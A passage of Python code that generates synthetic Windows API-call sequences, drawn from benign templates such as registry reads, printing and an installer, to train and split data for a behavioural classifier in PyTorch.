            ("HttpSendRequestW", "lpszHeaders=Accept:text/html"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=32768"),
            ("InternetCloseHandle", "hInternet=handle"),
        ],
        # Service startup
        [
            ("OpenSCManagerW", "dwDesiredAccess=SC_MANAGER_CONNECT"),
            ("OpenServiceW", "lpServiceName=Spooler,dwDesiredAccess=SERVICE_QUERY_STATUS"),
            ("QueryServiceStatusEx", "hService=spooler"),
            ("CloseServiceHandle", "hSCObject=handle"),
        ],
        # Registry query (settings)
        [
            ("RegOpenKeyExW", "hKey=HKCU,lpSubKey=Software\\MyApp\\Settings"),
            ("RegQueryValueExW", "lpValueName=Theme"),
            ("RegQueryValueExW", "lpValueName=Language"),
            ("RegQueryValueExW", "lpValueName=WindowSize"),
            ("RegCloseKey", "hKey=handle"),
        ],
        # COM initialization (normal app)
        [
            ("CoInitializeEx", "dwCoInit=COINIT_APARTMENTTHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_FileOpenDialog"),
            ("GetOpenFileNameW", "lpofn=filter_all"),
            ("CreateFileW", "lpFileName=selected.txt,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=8192"),
            ("CloseHandle", "hObject=handle"),
            ("CoUninitialize", ""),
        ],
        # Print spooler interaction
        [
            ("OpenPrinterW", "pPrinterName=Default Printer"),
            ("StartDocPrinterW", "hPrinter=handle,Level=1"),
            ("StartPagePrinter", "hPrinter=handle"),
            ("WritePrinter", "hPrinter=handle,pBuf=data,cbBuf=65536"),
            ("EndPagePrinter", "hPrinter=handle"),
            ("EndDocPrinter", "hPrinter=handle"),
            ("ClosePrinter", "hPrinter=handle"),
        ],
        # Installer / setup
        [
            ("GetTempPathW", "lpBuffer=out,nBufferLength=260"),
            ("CreateDirectoryW", "lpPathName=C:\\Program Files\\MyApp"),
            ("CopyFileW", "lpExistingFileName=setup_files\\app.exe,lpNewFileName=C:\\Program Files\\MyApp\\app.exe"),
            ("CopyFileW", "lpExistingFileName=setup_files\\config.ini,lpNewFileName=C:\\Program Files\\MyApp\\config.ini"),
            ("RegCreateKeyExW", "hKey=HKLM,lpSubKey=SOFTWARE\\MyApp"),
            ("RegSetValueExW", "lpValueName=InstallPath,lpData=C:\\Program Files\\MyApp"),
            ("ShellExecuteW", "lpFile=C:\\Program Files\\MyApp\\app.exe"),
        ],
    ],
}

# fmt: on


# ═══════════════════════════════════════════════════════════════════════════
# Generator configuration
# ═══════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class GeneratorConfig:
    """Configuration knobs for the behavioural data generator.

    Attributes:
        samples_per_class: Number of samples generated for each of the 20
            categories.  Default 5 000 → 100 000 total.
        sequence_length: Number of API call slots per sample.
        noise_ratio_low: Minimum fraction of the sequence filled with
            benign noise calls.
        noise_ratio_high: Maximum fraction.
        failure_rate: Probability that any individual API call returns an
            error code instead of 0.
        timing_mu: Mean of the log-normal distribution for inter-call
            delta_ms.
        timing_sigma: Sigma of the log-normal distribution.
        train_ratio: Fraction allocated to the training split.
        val_ratio: Fraction allocated to the validation split.
        batch_size: Mini-batch size for the returned DataLoaders.
        seed: Master PRNG seed for full reproducibility.
        num_workers: DataLoader worker processes.
        class_distribution: Optional per-class sample counts. When
            provided, *samples_per_class* is ignored and this dict
            is used directly (keyed by ``BehaviorCategory`` int value).
    """

    samples_per_class: int = 5_000
    sequence_length: int = 512
    noise_ratio_low: float = 0.10
    noise_ratio_high: float = 0.30
    failure_rate: float = 0.05
    timing_mu: float = 1.5
    timing_sigma: float = 1.2
    train_ratio: float = 0.80
    val_ratio: float = 0.10
    batch_size: int = 256
    seed: int = 42
    num_workers: int = 0
    class_distribution: Optional[dict[int, int]] = None

    def __post_init__(self) -> None:
        if self.samples_per_class < 1 or self.samples_per_class > _MAX_SAMPLES_PER_CLASS:
            raise ValueError(
                f"samples_per_class must be in [1, {_MAX_SAMPLES_PER_CLASS}], "
                f"got {self.samples_per_class}"
            )
        if self.sequence_length < 8 or self.sequence_length > _MAX_SEQUENCE_LENGTH:
            raise ValueError(
                f"sequence_length must be in [8, {_MAX_SEQUENCE_LENGTH}], "
                f"got {self.sequence_length}"
            )
        if not (0.0 <= self.noise_ratio_low <= self.noise_ratio_high <= 1.0):
            raise ValueError(
                f"Invalid noise ratio range: [{self.noise_ratio_low}, {self.noise_ratio_high}]"
            )
        if not (0.0 <= self.failure_rate <= 1.0):
            raise ValueError(f"failure_rate must be in [0, 1], got {self.failure_rate}")
        total_split = self.train_ratio + self.val_ratio
        if total_split >= 1.0 or total_split <= 0.0:
            raise ValueError(
                f"train_ratio + val_ratio must be in (0, 1), got {total_split}"
            )


# ═══════════════════════════════════════════════════════════════════════════
# Core generator
# ═══════════════════════════════════════════════════════════════════════════

class BehavioralDataGenerator:
    """Generate synthetic API-call-sequence datasets for behavioural
    classification training.

    Parameters
    ----------
    config : GeneratorConfig
        All tuneable knobs.
    """

    def __init__(self, config: Optional[GeneratorConfig] = None) -> None:
        self._cfg = config or GeneratorConfig()
        self._rng = np.random.default_rng(self._cfg.seed)

        # Pre-compute noise API features once.
        self._noise_features: NDArray[np.float32] = np.array(
            [
                [float(_get_api_id(name)), float(_stable_arg_hash(args)), 0.0, 0.0]
                for name, args in _BENIGN_NOISE_APIS
            ],
            dtype=np.float32,
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate_dataset(
        self,
    ) -> tuple[NDArray[np.float32], NDArray[np.int64]]:
        """Generate the full dataset as numpy arrays.

        Returns
        -------
        X : ndarray of shape (N, sequence_length, 4)
        y : ndarray of shape (N,)
        """
        cfg = self._cfg
        per_class = self._resolve_class_counts()
        total = sum(per_class.values())

        logger.info(
            "Generating %d samples across %d classes (seq_len=%d)",
            total,
            NUM_CLASSES,
            cfg.sequence_length,
        )

        X = np.zeros((total, cfg.sequence_length, 4), dtype=np.float32)
        y = np.zeros(total, dtype=np.int64)

        idx = 0
        for cls_id in range(NUM_CLASSES):
            count = per_class[cls_id]
            templates = _TEMPLATES[cls_id]
            for i in range(count):
                X[idx] = self._generate_single(cls_id, templates)
                y[idx] = cls_id
                idx += 1

            logger.info(
                "  [%2d] %-20s — %d samples generated",
                cls_id,
                BehaviorCategory(cls_id).name,
                count,
            )

        # Shuffle the entire dataset deterministically.
        perm = self._rng.permutation(total)
        X = X[perm]
        y = y[perm]

        logger.info("Dataset generated: X=%s  y=%s", X.shape, y.shape)
        return X, y

    def generate_splits(
        self,
    ) -> tuple[
        tuple[NDArray[np.float32], NDArray[np.int64]],
        tuple[NDArray[np.float32], NDArray[np.int64]],
        tuple[NDArray[np.float32], NDArray[np.int64]],
    ]:
        """Generate and split into train / val / test.

        Returns
        -------
        (X_train, y_train), (X_val, y_val), (X_test, y_test)
        """
        X, y = self.generate_dataset()
        n = len(y)
        n_train = int(n * self._cfg.train_ratio)
        n_val = int(n * self._cfg.val_ratio)

        X_train, y_train = X[:n_train], y[:n_train]
        X_val, y_val = X[n_train : n_train + n_val], y[n_train : n_train + n_val]
        X_test, y_test = X[n_train + n_val :], y[n_train + n_val :]

        logger.info(
            "Splits — train=%d  val=%d  test=%d",
            len(y_train),
            len(y_val),
            len(y_test),
        )
        return (X_train, y_train), (X_val, y_val), (X_test, y_test)

    def generate_dataloaders(
        self,
    ) -> tuple[DataLoader, DataLoader, DataLoader, torch.Tensor]:
        """Generate train/val/test DataLoaders and class-weight tensor.

        Returns
        -------
        train_loader, val_loader, test_loader, class_weights
        """
        (X_train, y_train), (X_val, y_val), (X_test, y_test) = self.generate_splits()

        class_weights = self._compute_class_weights(y_train)

        train_dl = self._make_loader(X_train, y_train, shuffle=True)
        val_dl = self._make_loader(X_val, y_val, shuffle=False)
        test_dl = self._make_loader(X_test, y_test, shuffle=False)

        logger.info(
            "DataLoaders ready — batch_size=%d  class_weights_range=[%.4f, %.4f]",
            self._cfg.batch_size,
            class_weights.min().item(),
            class_weights.max().item(),
        )
        return train_dl, val_dl, test_dl, class_weights

    # ------------------------------------------------------------------
    # Class weight computation
    # ------------------------------------------------------------------

    @staticmethod
    def _compute_class_weights(y: NDArray[np.int64]) -> torch.Tensor:
        """Compute inverse-frequency class weights for imbalanced training.

        Uses the "balanced" strategy: ``weight[c] = N / (K * count[c])``
        where N is total samples and K is number of classes.

        Returns a float32 tensor of shape ``(NUM_CLASSES,)``.
        """
        counts = np.bincount(y, minlength=NUM_CLASSES).astype(np.float64)
        total = float(y.shape[0])
        weights = np.where(
            counts > 0,
            total / (float(NUM_CLASSES) * counts),
            1.0,
        )
        return torch.tensor(weights, dtype=torch.float32)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _resolve_class_counts(self) -> dict[int, int]:
        """Return per-class sample counts respecting custom distributions."""
        if self._cfg.class_distribution is not None:
            out: dict[int, int] = {}
            for cls_id in range(NUM_CLASSES):
                count = self._cfg.class_distribution.get(cls_id, 0)
                if count < 0 or count > _MAX_SAMPLES_PER_CLASS:
                    raise ValueError(
                        f"class_distribution[{cls_id}] = {count} is out of range"
                    )
                out[cls_id] = count
            return out
        return {cls_id: self._cfg.samples_per_class for cls_id in range(NUM_CLASSES)}

    def _generate_single(
        self,
        cls_id: int,
        templates: list[ChainTemplate],
    ) -> NDArray[np.float32]:
        """Generate a single sample of shape ``(sequence_length, 4)``."""
        cfg = self._cfg
        seq_len = cfg.sequence_length
        out = np.zeros((seq_len, 4), dtype=np.float32)

        # Choose a random chain template for this sample.
        tpl_idx = int(self._rng.integers(0, len(templates)))
        chain = templates[tpl_idx]

        # Decide the noise ratio for this sample.
        noise_ratio = self._rng.uniform(cfg.noise_ratio_low, cfg.noise_ratio_high)
        n_noise = int(seq_len * noise_ratio)
        n_chain = seq_len - n_noise

        # Build the chain portion: tile the template to fill n_chain slots.
        chain_features = self._tile_chain(chain, n_chain)

        # Build the noise portion.
        noise_features = self._sample_noise(n_noise)

        # Merge chain and noise: randomly assign positions.
        all_positions = np.arange(seq_len)
        noise_positions = np.sort(
            self._rng.choice(all_positions, size=n_noise, replace=False)
        )
        chain_positions = np.setdiff1d(all_positions, noise_positions)

        out[chain_positions] = chain_features
        out[noise_positions] = noise_features

        # Assign inter-call timings (log-normal).
        timings = self._rng.lognormal(
            mean=cfg.timing_mu, sigma=cfg.timing_sigma, size=seq_len
        ).astype(np.float32)
        # First call has zero delta.
        timings[0] = 0.0
        out[:, 3] = timings

        # Inject failures at the configured rate.
        failure_mask = self._rng.random(seq_len) < cfg.failure_rate
        n_failures = int(failure_mask.sum())
        if n_failures > 0:
            error_codes = self._rng.choice(
                _COMMON_ERROR_IDS, size=n_failures
            ).astype(np.float32)
            out[failure_mask, 2] = error_codes

        return out

    def _tile_chain(
        self,
        chain: ChainTemplate,
        length: int,
    ) -> NDArray[np.float32]:
        """Tile an API chain template to *length* rows, adding minor variation."""
        chain_len = len(chain)
        if chain_len == 0:
            return np.zeros((length, 4), dtype=np.float32)

        # Pre-compute feature rows for the chain.
        base = np.zeros((chain_len, 4), dtype=np.float32)
        for i, (api_name, arg_desc) in enumerate(chain):
            base[i, 0] = float(_get_api_id(api_name))
            base[i, 1] = float(_stable_arg_hash(arg_desc))
            base[i, 2] = 0.0  # success (failures injected later)
            base[i, 3] = 0.0  # timing injected later

        # Tile to fill `length`.
        full_reps = length // chain_len
        remainder = length % chain_len

        parts: list[NDArray[np.float32]] = []
        for _ in range(full_reps):
            rep = base.copy()
            # Add small jitter to arg_hash to model argument variation
            # across repeated chain executions (e.g. different file paths).
            jitter = self._rng.integers(
                0, API_VOCABULARY_SIZE, size=chain_len
            ).astype(np.float32)
            rep[:, 1] = (rep[:, 1] + jitter) % API_VOCABULARY_SIZE
            parts.append(rep)

        if remainder > 0:
            rep = base[:remainder].copy()
            jitter = self._rng.integers(
                0, API_VOCABULARY_SIZE, size=remainder
            ).astype(np.float32)
            rep[:, 1] = (rep[:, 1] + jitter) % API_VOCABULARY_SIZE
            parts.append(rep)

        return np.concatenate(parts, axis=0)

    def _sample_noise(self, count: int) -> NDArray[np.float32]:
        """Sample *count* benign noise rows (api_id, arg_hash, 0, 0)."""
        if count == 0:
            return np.zeros((0, 4), dtype=np.float32)
        indices = self._rng.integers(0, len(self._noise_features), size=count)
        return self._noise_features[indices].copy()

    def _make_loader(
        self,
        X: NDArray[np.float32],
        y: NDArray[np.int64],
        *,
        shuffle: bool,
    ) -> DataLoader:
        """Wrap numpy arrays into a PyTorch DataLoader."""
        dataset = TensorDataset(
            torch.from_numpy(X),
            torch.from_numpy(y),
        )
        return DataLoader(
            dataset,
            batch_size=self._cfg.batch_size,
            shuffle=shuffle,
            num_workers=self._cfg.num_workers,
            pin_memory=True,
            drop_last=False,
        )
